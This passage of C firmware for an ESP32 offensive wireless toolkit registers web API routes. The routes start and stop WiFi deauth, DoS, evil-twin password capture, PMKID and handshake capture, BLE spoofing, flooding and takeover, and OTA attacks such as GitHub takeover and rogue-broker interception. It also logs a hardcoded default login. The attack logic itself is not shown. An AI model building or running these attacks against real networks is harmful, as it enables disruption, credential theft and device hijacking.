    ESP_LOGI(TAG, "Starting Deauth Detector");
    deauth_detector_start();
    return send_success_response(req);
}

static esp_err_t deauth_detect_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping Deauth Detector");
    deauth_detector_stop();
    return send_success_response(req);
}

static esp_err_t stop_all_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_timer_active = false;
    stop_deauth_attack();
    deauth_detector_stop();
    attack_beacon_spam_stop();
    attack_dos_stop();
    attack_handshake_stop();
    attack_pmkid_stop();
    attack_probe_stop();
    attack_bt_spam_stop();
    attack_eviltwin_stop();
    ble_deauth_stop();
    ble_connect_flood_stop();
    ble_l2cap_flood_stop();
    ble_gatt_probe_stop();
    ble_spoof_stop();
    ble_passkey_stop();
    ble_takeover_stop();
    ota_attack_stop();

    return send_success_response(req);
}

/* ================================================================== */
/*  SERVER START / STOP                                                */
/* ================================================================== */

void start_web_server(void) {
    /* Guard: don't start if already running */
    if (server_handle != NULL) {
        ESP_LOGW(TAG, "Web server already running, skipping.");
        return;
    }

    /* Log free heap before server start for debugging */
    ESP_LOGI(TAG, "Free heap before httpd_start: %u bytes", (unsigned)esp_get_free_heap_size());

    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.max_uri_handlers = 102;      /* 100 + 2 new BLE status endpoints */
    config.max_open_sockets = 4;         /* Reduced from default 7 to save heap */
    config.recv_wait_timeout = 10;
    config.send_wait_timeout = 10;       /* Add send timeout to prevent socket leaks */
    config.stack_size = 8192;            /* Reduced from 16384 — saves 8 KB heap */
    
    if (httpd_start(&server, &config) == ESP_OK) {
        ESP_LOGI(TAG, "Web server started. Free heap after: %u bytes", (unsigned)esp_get_free_heap_size());
        server_handle = server;

        /* Core routes */
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_handler };
        httpd_register_uri_handler(server, &root);
        httpd_uri_t login_get = { .uri = "/login", .method = HTTP_GET, .handler = login_handler };
        httpd_register_uri_handler(server, &login_get);
        httpd_uri_t login_post = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
        httpd_register_uri_handler(server, &login_post);
        httpd_uri_t dashboard = { .uri = "/dashboard", .method = HTTP_GET, .handler = dashboard_handler };
        httpd_register_uri_handler(server, &dashboard);
        httpd_uri_t logout = { .uri = "/logout", .method = HTTP_GET, .handler = logout_handler };
        httpd_register_uri_handler(server, &logout);

        /* WiFi API */
        httpd_uri_t scan = { .uri = "/api/scan", .method = HTTP_GET, .handler = scan_api_handler };
        httpd_register_uri_handler(server, &scan);
        httpd_uri_t mgmt_ap_get = { .uri = "/api/mgmt-ap", .method = HTTP_GET, .handler = mgmt_ap_get_handler };
        httpd_register_uri_handler(server, &mgmt_ap_get);
        httpd_uri_t mgmt_ap_set = { .uri = "/api/mgmt-ap", .method = HTTP_POST, .handler = mgmt_ap_set_handler };
        httpd_register_uri_handler(server, &mgmt_ap_set);
        httpd_uri_t mgmt_ap_reset = { .uri = "/api/mgmt-ap/reset", .method = HTTP_POST, .handler = mgmt_ap_reset_handler };
        httpd_register_uri_handler(server, &mgmt_ap_reset);
        httpd_uri_t attack = { .uri = "/api/attack", .method = HTTP_POST, .handler = attack_api_handler };
        httpd_register_uri_handler(server, &attack);
        httpd_uri_t stop = { .uri = "/api/stop", .method = HTTP_POST, .handler = stop_api_handler };
        httpd_register_uri_handler(server, &stop);
        httpd_uri_t status = { .uri = "/api/status", .method = HTTP_GET, .handler = status_api_handler };
        httpd_register_uri_handler(server, &status);
        httpd_uri_t detector = { .uri = "/api/detector", .method = HTTP_GET, .handler = detector_api_handler };
        httpd_register_uri_handler(server, &detector);
        httpd_uri_t deauth_detect_start = { .uri = "/api/deauth-detect/start", .method = HTTP_POST, .handler = deauth_detect_start_handler };
        httpd_register_uri_handler(server, &deauth_detect_start);
        httpd_uri_t deauth_detect_stop = { .uri = "/api/deauth-detect/stop", .method = HTTP_POST, .handler = deauth_detect_stop_handler };
        httpd_register_uri_handler(server, &deauth_detect_stop);
        httpd_uri_t deauth_detect_status = { .uri = "/api/deauth-detect/status", .method = HTTP_GET, .handler = detector_api_handler };
        httpd_register_uri_handler(server, &deauth_detect_status);
        httpd_uri_t beacon_start = { .uri = "/api/beacon/start", .method = HTTP_POST, .handler = beacon_start_handler };
        httpd_register_uri_handler(server, &beacon_start);
        httpd_uri_t beacon_stop = { .uri = "/api/beacon/stop", .method = HTTP_POST, .handler = beacon_stop_handler };
        httpd_register_uri_handler(server, &beacon_stop);
        httpd_uri_t beacon_status = { .uri = "/api/beacon/status", .method = HTTP_GET, .handler = beacon_status_handler };
        httpd_register_uri_handler(server, &beacon_status);
        httpd_uri_t dos_start = { .uri = "/api/dos/start", .method = HTTP_POST, .handler = dos_start_handler };
        httpd_register_uri_handler(server, &dos_start);
        httpd_uri_t dos_stop = { .uri = "/api/dos/stop", .method = HTTP_POST, .handler = dos_stop_handler };
        httpd_register_uri_handler(server, &dos_stop);
        httpd_uri_t dos_status = { .uri = "/api/dos/status", .method = HTTP_GET, .handler = dos_status_handler };
        httpd_register_uri_handler(server, &dos_status);

        /* Handshake API */
        httpd_uri_t handshake_start_uri = { .uri = "/api/handshake/start", .method = HTTP_POST, .handler = handshake_start_handler };
        httpd_register_uri_handler(server, &handshake_start_uri);
        httpd_uri_t handshake_stop_uri = { .uri = "/api/handshake/stop", .method = HTTP_POST, .handler = handshake_stop_handler };
        httpd_register_uri_handler(server, &handshake_stop_uri);
        httpd_uri_t handshake_status_uri = { .uri = "/api/handshake/status", .method = HTTP_GET, .handler = handshake_status_handler };
        httpd_register_uri_handler(server, &handshake_status_uri);
        httpd_uri_t handshake_pcap_uri = { .uri = "/api/handshake/pcap", .method = HTTP_GET, .handler = handshake_pcap_handler };
        httpd_register_uri_handler(server, &handshake_pcap_uri);

        /* PMKID API */
        httpd_uri_t pmkid_start_uri = { .uri = "/api/pmkid/start", .method = HTTP_POST, .handler = pmkid_start_handler };
        httpd_register_uri_handler(server, &pmkid_start_uri);
        httpd_uri_t pmkid_stop_uri = { .uri = "/api/pmkid/stop", .method = HTTP_POST, .handler = pmkid_stop_handler };
        httpd_register_uri_handler(server, &pmkid_stop_uri);
        httpd_uri_t pmkid_status_uri = { .uri = "/api/pmkid/status", .method = HTTP_GET, .handler = pmkid_status_handler };
        httpd_register_uri_handler(server, &pmkid_status_uri);
        httpd_uri_t pmkid_hash_uri = { .uri = "/api/pmkid/hash", .method = HTTP_GET, .handler = pmkid_hash_handler };
        httpd_register_uri_handler(server, &pmkid_hash_uri);

        /* Probe Sniffer API */
        httpd_uri_t probe_start = { .uri = "/api/probe/start", .method = HTTP_POST, .handler = probe_start_handler };
        httpd_register_uri_handler(server, &probe_start);
        httpd_uri_t probe_stop = { .uri = "/api/probe/stop", .method = HTTP_POST, .handler = probe_stop_handler };
        httpd_register_uri_handler(server, &probe_stop);
        httpd_uri_t probe_status = { .uri = "/api/probe/status", .method = HTTP_GET, .handler = probe_status_handler };
        httpd_register_uri_handler(server, &probe_status);
        httpd_uri_t probe_ghosts = { .uri = "/api/probe/ghosts", .method = HTTP_GET, .handler = probe_ghosts_handler };
        httpd_register_uri_handler(server, &probe_ghosts);
        httpd_uri_t probe_clear = { .uri = "/api/probe/clear", .method = HTTP_POST, .handler = probe_clear_handler };
        httpd_register_uri_handler(server, &probe_clear);

        /* Evil Twin API */
        httpd_uri_t eviltwin_start = { .uri = "/api/eviltwin/start", .method = HTTP_POST, .handler = eviltwin_start_handler };
        httpd_register_uri_handler(server, &eviltwin_start);
        httpd_uri_t eviltwin_stop = { .uri = "/api/eviltwin/stop", .method = HTTP_POST, .handler = eviltwin_stop_handler };
        httpd_register_uri_handler(server, &eviltwin_stop);
        httpd_uri_t eviltwin_status = { .uri = "/api/eviltwin/status", .method = HTTP_GET, .handler = eviltwin_status_handler };
        httpd_register_uri_handler(server, &eviltwin_status);
        httpd_uri_t eviltwin_passwords = { .uri = "/api/eviltwin/passwords", .method = HTTP_GET, .handler = eviltwin_passwords_handler };
        httpd_register_uri_handler(server, &eviltwin_passwords);
        httpd_uri_t eviltwin_clear = { .uri = "/api/eviltwin/clear", .method = HTTP_POST, .handler = eviltwin_clear_handler };
        httpd_register_uri_handler(server, &eviltwin_clear);

        /* BLE API */
        httpd_uri_t ble_scan_uri = { .uri = "/api/ble/scan", .method = HTTP_GET, .handler = ble_scan_api_handler };
        httpd_register_uri_handler(server, &ble_scan_uri);
        httpd_uri_t ble_status_uri = { .uri = "/api/ble/status", .method = HTTP_GET, .handler = ble_status_api_handler };
        httpd_register_uri_handler(server, &ble_status_uri);
        httpd_uri_t ble_spam_start_uri = { .uri = "/api/ble/spam/start", .method = HTTP_POST, .handler = ble_spam_start_handler };
        httpd_register_uri_handler(server, &ble_spam_start_uri);
        httpd_uri_t ble_spam_stop_uri = { .uri = "/api/ble/spam/stop", .method = HTTP_POST, .handler = ble_spam_stop_handler };
        httpd_register_uri_handler(server, &ble_spam_stop_uri);
        httpd_uri_t ble_spam_status_uri = { .uri = "/api/ble/spam/status", .method = HTTP_GET, .handler = ble_spam_status_handler };
        httpd_register_uri_handler(server, &ble_spam_status_uri);
        httpd_uri_t ble_spoof_start_uri = { .uri = "/api/ble/spoof/start", .method = HTTP_POST, .handler = ble_spoof_start_handler };
        httpd_register_uri_handler(server, &ble_spoof_start_uri);
        httpd_uri_t ble_spoof_stop_uri = { .uri = "/api/ble/spoof/stop", .method = HTTP_POST, .handler = ble_spoof_stop_handler };
        httpd_register_uri_handler(server, &ble_spoof_stop_uri);
        httpd_uri_t ble_spoof_clone_uri = { .uri = "/api/ble/spoof/clone", .method = HTTP_POST, .handler = ble_spoof_clone_handler };
        httpd_register_uri_handler(server, &ble_spoof_clone_uri);
        httpd_uri_t ble_connect_start_uri = { .uri = "/api/ble/connect/start", .method = HTTP_POST, .handler = ble_connect_start_handler };
        httpd_register_uri_handler(server, &ble_connect_start_uri);
        httpd_uri_t ble_connect_stop_uri = { .uri = "/api/ble/connect/stop", .method = HTTP_POST, .handler = ble_connect_stop_handler };
        httpd_register_uri_handler(server, &ble_connect_stop_uri);
        httpd_uri_t ble_l2cap_start_uri = { .uri = "/api/ble/l2cap/start", .method = HTTP_POST, .handler = ble_l2cap_start_handler };
        httpd_register_uri_handler(server, &ble_l2cap_start_uri);
        httpd_uri_t ble_l2cap_stop_uri = { .uri = "/api/ble/l2cap/stop", .method = HTTP_POST, .handler = ble_l2cap_stop_handler };
        httpd_register_uri_handler(server, &ble_l2cap_stop_uri);
        httpd_uri_t ble_l2cap_status_uri = { .uri = "/api/ble/l2cap/status", .method = HTTP_GET, .handler = ble_l2cap_status_handler };
        httpd_register_uri_handler(server, &ble_l2cap_status_uri);
        httpd_uri_t ble_gatt_start_uri = { .uri = "/api/ble/gatt/start", .method = HTTP_POST, .handler = ble_gatt_start_handler };
        httpd_register_uri_handler(server, &ble_gatt_start_uri);
        httpd_uri_t ble_gatt_stop_uri = { .uri = "/api/ble/gatt/stop", .method = HTTP_POST, .handler = ble_gatt_stop_handler };
        httpd_register_uri_handler(server, &ble_gatt_stop_uri);
        httpd_uri_t ble_deauth_start_uri = { .uri = "/api/ble/deauth/start", .method = HTTP_POST, .handler = ble_deauth_start_handler };
        httpd_register_uri_handler(server, &ble_deauth_start_uri);
        httpd_uri_t ble_deauth_stop_uri = { .uri = "/api/ble/deauth/stop", .method = HTTP_POST, .handler = ble_deauth_stop_handler };
        httpd_register_uri_handler(server, &ble_deauth_stop_uri);
        httpd_uri_t ble_deauth_status_uri = { .uri = "/api/ble/deauth/status", .method = HTTP_GET, .handler = ble_deauth_status_handler };
        httpd_register_uri_handler(server, &ble_deauth_status_uri);
        httpd_uri_t ble_passkey_start_uri = { .uri = "/api/ble/passkey/start", .method = HTTP_POST, .handler = ble_passkey_start_handler };
        httpd_register_uri_handler(server, &ble_passkey_start_uri);
        httpd_uri_t ble_passkey_stop_uri = { .uri = "/api/ble/passkey/stop", .method = HTTP_POST, .handler = ble_passkey_stop_handler };
        httpd_register_uri_handler(server, &ble_passkey_stop_uri);
        httpd_uri_t ble_passkey_status_uri = { .uri = "/api/ble/passkey/status", .method = HTTP_GET, .handler = ble_passkey_status_handler };
        httpd_register_uri_handler(server, &ble_passkey_status_uri);
        httpd_uri_t ble_takeover_start_uri = { .uri = "/api/ble/takeover/start", .method = HTTP_POST, .handler = ble_takeover_start_handler };
        httpd_register_uri_handler(server, &ble_takeover_start_uri);
        httpd_uri_t ble_takeover_stop_uri = { .uri = "/api/ble/takeover/stop", .method = HTTP_POST, .handler = ble_takeover_stop_handler };
        httpd_register_uri_handler(server, &ble_takeover_stop_uri);
        httpd_uri_t ble_takeover_status_uri = { .uri = "/api/ble/takeover/status", .method = HTTP_GET, .handler = ble_takeover_status_handler };
        httpd_register_uri_handler(server, &ble_takeover_status_uri);
        httpd_uri_t ble_takeover_services_uri = { .uri = "/api/ble/takeover/services", .method = HTTP_GET, .handler = ble_takeover_services_handler };
        httpd_register_uri_handler(server, &ble_takeover_services_uri);
        httpd_uri_t ble_takeover_read_uri = { .uri = "/api/ble/takeover/read", .method = HTTP_POST, .handler = ble_takeover_read_handler };
        httpd_register_uri_handler(server, &ble_takeover_read_uri);
        httpd_uri_t ble_takeover_write_uri = { .uri = "/api/ble/takeover/write", .method = HTTP_POST, .handler = ble_takeover_write_handler };
        httpd_register_uri_handler(server, &ble_takeover_write_uri);
        httpd_uri_t ble_takeover_notify_uri = { .uri = "/api/ble/takeover/notify", .method = HTTP_POST, .handler = ble_takeover_notify_handler };
        httpd_register_uri_handler(server, &ble_takeover_notify_uri);
        httpd_uri_t ble_takeover_notifs_uri = { .uri = "/api/ble/takeover/notifs", .method = HTTP_GET, .handler = ble_takeover_notifs_handler };
        httpd_register_uri_handler(server, &ble_takeover_notifs_uri);
        httpd_uri_t stop_all = { .uri = "/api/stop/all", .method = HTTP_POST, .handler = stop_all_handler };
        httpd_register_uri_handler(server, &stop_all);

        /* OTA Attack API */
        httpd_uri_t ota_start_uri = { .uri = "/api/ota/start", .method = HTTP_POST, .handler = ota_start_handler };
        httpd_register_uri_handler(server, &ota_start_uri);
        httpd_uri_t ota_stop_uri = { .uri = "/api/ota/stop", .method = HTTP_POST, .handler = ota_stop_handler };
        httpd_register_uri_handler(server, &ota_stop_uri);
        httpd_uri_t ota_status_uri = { .uri = "/api/ota/status", .method = HTTP_GET, .handler = ota_status_handler };
        httpd_register_uri_handler(server, &ota_status_uri);
        httpd_uri_t ota_messages_uri = { .uri = "/api/ota/messages", .method = HTTP_GET, .handler = ota_messages_handler };
        httpd_register_uri_handler(server, &ota_messages_uri);
        httpd_uri_t ota_urls_uri = { .uri = "/api/ota/urls", .method = HTTP_GET, .handler = ota_urls_handler };
        httpd_register_uri_handler(server, &ota_urls_uri);
        httpd_uri_t ota_github_urls_uri = { .uri = "/api/ota/github/urls", .method = HTTP_GET, .handler = ota_github_urls_handler };
        httpd_register_uri_handler(server, &ota_github_urls_uri);
        httpd_uri_t ota_inject_uri = { .uri = "/api/ota/inject", .method = HTTP_POST, .handler = ota_inject_handler };
        httpd_register_uri_handler(server, &ota_inject_uri);
        httpd_uri_t ota_download_uri = { .uri = "/api/ota/download", .method = HTTP_POST, .handler = ota_download_handler };
        httpd_register_uri_handler(server, &ota_download_uri);
        httpd_uri_t ota_download_result_uri = { .uri = "/api/ota/download/result", .method = HTTP_GET, .handler = ota_download_result_handler };
        httpd_register_uri_handler(server, &ota_download_result_uri);
        httpd_uri_t ota_dns_uri = { .uri = "/api/ota/dns", .method = HTTP_GET, .handler = ota_dns_handler };
        httpd_register_uri_handler(server, &ota_dns_uri);
        httpd_uri_t ota_http_uri = { .uri = "/api/ota/http", .method = HTTP_GET, .handler = ota_http_entries_handler };
        httpd_register_uri_handler(server, &ota_http_uri);
        /* OTA GitHub repo operations */
        httpd_uri_t ota_github_parse_uri = { .uri = "/api/ota/github/parse", .method = HTTP_POST, .handler = ota_github_parse_handler };
        httpd_register_uri_handler(server, &ota_github_parse_uri);
        httpd_uri_t ota_github_access_uri = { .uri = "/api/ota/github/access", .method = HTTP_POST, .handler = ota_github_access_handler };
        httpd_register_uri_handler(server, &ota_github_access_uri);
        httpd_uri_t ota_github_list_uri = { .uri = "/api/ota/github/list", .method = HTTP_GET, .handler = ota_github_list_handler };
        httpd_register_uri_handler(server, &ota_github_list_uri);
        httpd_uri_t ota_github_sha_uri = { .uri = "/api/ota/github/file-sha", .method = HTTP_POST, .handler = ota_github_file_sha_handler };
        httpd_register_uri_handler(server, &ota_github_sha_uri);
        httpd_uri_t ota_github_upload_uri = { .uri = "/api/ota/github/upload", .method = HTTP_POST, .handler = ota_github_upload_handler };
        httpd_register_uri_handler(server, &ota_github_upload_uri);
        httpd_uri_t ota_github_repo_uri = { .uri = "/api/ota/github/repo", .method = HTTP_GET, .handler = ota_github_repo_handler };
        httpd_register_uri_handler(server, &ota_github_repo_uri);
        httpd_uri_t ota_github_result_uri = { .uri = "/api/ota/github/result", .method = HTTP_GET, .handler = ota_github_result_handler };
        httpd_register_uri_handler(server, &ota_github_result_uri);
        httpd_uri_t ota_chain_uri = { .uri = "/api/ota/chain", .method = HTTP_POST, .handler = ota_chain_handler };
        httpd_register_uri_handler(server, &ota_chain_uri);

        /* OTA Provision Sniffer API */
        httpd_uri_t ota_prov_creds_uri = { .uri = "/api/ota/prov/creds", .method = HTTP_GET, .handler = ota_prov_creds_handler };
        httpd_register_uri_handler(server, &ota_prov_creds_uri);
        httpd_uri_t ota_prov_summary_uri = { .uri = "/api/ota/prov/summary", .method = HTTP_GET, .handler = ota_prov_summary_handler };
        httpd_register_uri_handler(server, &ota_prov_summary_uri);
        httpd_uri_t ota_prov_clear_uri = { .uri = "/api/ota/prov/clear", .method = HTTP_POST, .handler = ota_prov_clear_handler };
        httpd_register_uri_handler(server, &ota_prov_clear_uri);

        /* OTA Rogue Broker API */
        httpd_uri_t ota_mitm_msgs_uri = { .uri = "/api/ota/mitm/messages", .method = HTTP_GET, .handler = ota_mitm_messages_handler };
        httpd_register_uri_handler(server, &ota_mitm_msgs_uri);
        httpd_uri_t ota_rb_summary_uri = { .uri = "/api/ota/rogue-broker/summary", .method = HTTP_GET, .handler = ota_rogue_broker_summary_handler };
        httpd_register_uri_handler(server, &ota_rb_summary_uri);
        httpd_uri_t ota_mitm_modify_uri = { .uri = "/api/ota/mitm/modify", .method = HTTP_POST, .handler = ota_mitm_modify_handler };
        httpd_register_uri_handler(server, &ota_mitm_modify_uri);
        httpd_uri_t ota_mitm_clear_uri = { .uri = "/api/ota/mitm/clear", .method = HTTP_POST, .handler = ota_mitm_clear_handler };
        httpd_register_uri_handler(server, &ota_mitm_clear_uri);

        /* OTA Firmware Analysis API */
        httpd_uri_t ota_fw_analyze_uri = { .uri = "/api/ota/firmware/analyze", .method = HTTP_POST, .handler = ota_fw_analyze_handler };
        httpd_register_uri_handler(server, &ota_fw_analyze_uri);
        httpd_uri_t ota_fw_secrets_uri = { .uri = "/api/ota/firmware/secrets", .method = HTTP_GET, .handler = ota_fw_secrets_handler };
        httpd_register_uri_handler(server, &ota_fw_secrets_uri);
        httpd_uri_t ota_fw_summary_uri = { .uri = "/api/ota/firmware/summary", .method = HTTP_GET, .handler = ota_fw_summary_handler };
        httpd_register_uri_handler(server, &ota_fw_summary_uri);
        httpd_uri_t ota_fw_clear_uri = { .uri = "/api/ota/firmware/clear", .method = HTTP_POST, .handler = ota_fw_clear_handler };
        httpd_register_uri_handler(server, &ota_fw_clear_uri);
        
        ESP_LOGI(TAG, "==========================================");
        ESP_LOGI(TAG, "Omega Solutions - Complete Security Suite v7.0");
        ESP_LOGI(TAG, "Web server started! Open http://192.168.4.1");
        ESP_LOGI(TAG, "Username: omega | Password: solutions123");
        ESP_LOGI(TAG, "WiFi: Deauth, Deauth Detect, Beacon, DoS, Handshake, PMKID, Probe, EvilTwin");
        ESP_LOGI(TAG, "OTA: Sniff, Client, Inject, Fetch, Poll Sniff, GitHub Takeover, Provision Sniff, Rogue Broker, Firmware Analyze");
        ESP_LOGI(TAG, "BLE: Spam, Scan, Spoof, Clone, Connect, L2CAP, GATT, Deauth, Passkey, Takeover");
        ESP_LOGI(TAG, "==========================================");
    } else {
        ESP_LOGE(TAG, "FAILED to start web server! Free heap: %u bytes. "
                  "Reduce buffer sizes in ota_attack.h or webserver stack_size.",
                  (unsigned)esp_get_free_heap_size());
    }
}

void webserver_stop(void) {
    if (server_handle != NULL) {
        httpd_stop(server_handle);
        server_handle = NULL;
        ESP_LOGI(TAG, "Web server stopped.");
    }
}

void webserver_run(void) {
    if (server_handle == NULL) {
        start_web_server();
    }
}
